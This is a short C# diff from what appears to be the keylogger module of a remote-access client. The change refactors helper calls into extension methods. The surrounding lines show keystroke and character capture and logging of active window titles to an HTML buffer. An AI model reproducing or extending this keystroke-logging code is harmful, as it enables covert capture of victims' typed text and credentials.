@@ -100,7 +100,7 @@ namespace xClient.Core.Keylogger
                 _logFileBuffer.Append(@"<p class=""h""><br><br>[<b>" + activeWindowTitle + "</b>]</p><br>");
             }
 
-            if (LoggerHelper.IsModifierKeysSet(_pressedKeys))
+            if (_pressedKeys.IsModifierKeysSet())
             {
                 if (!_pressedKeys.Contains(e.KeyCode))
                 {
@@ -112,7 +112,7 @@ namespace xClient.Core.Keylogger
             // The keys below are excluded. If it is one of the keys below,
             // the KeyPress event will handle these characters. If the keys
             // are not any of those specified below, we can continue.
-            if (LoggerHelper.IsExcludedKey(e.KeyCode))
+            if (e.KeyCode.IsExcludedKey())
             {
                 // The key was not part of the keys that we wish to filter, so
                 // be sure to prevent a situation where multiple keys are pressed.
@@ -126,7 +126,7 @@ namespace xClient.Core.Keylogger
         //This method should be used to process all of our unicode characters
         private void Logger_KeyPress(object sender, KeyPressEventArgs e) //Called second
         {
-            if (LoggerHelper.IsModifierKeysSet(_pressedKeys))
+            if (_pressedKeys.IsModifierKeysSet())
                 return;
 
             if (!_pressedKeyChars.Contains(e.KeyChar) || !LoggerHelper.DetectKeyHolding(_pressedKeyChars, e.KeyChar))
@@ -153,7 +153,7 @@ namespace xClient.Core.Keylogger
                 names[i] = LoggerHelper.GetDisplayName(keys[i]);
             }
 
-            if (LoggerHelper.IsModifierKeysSet(_pressedKeys))
+            if (_pressedKeys.IsModifierKeysSet())
             {
                 StringBuilder specialKeys = new StringBuilder();
 
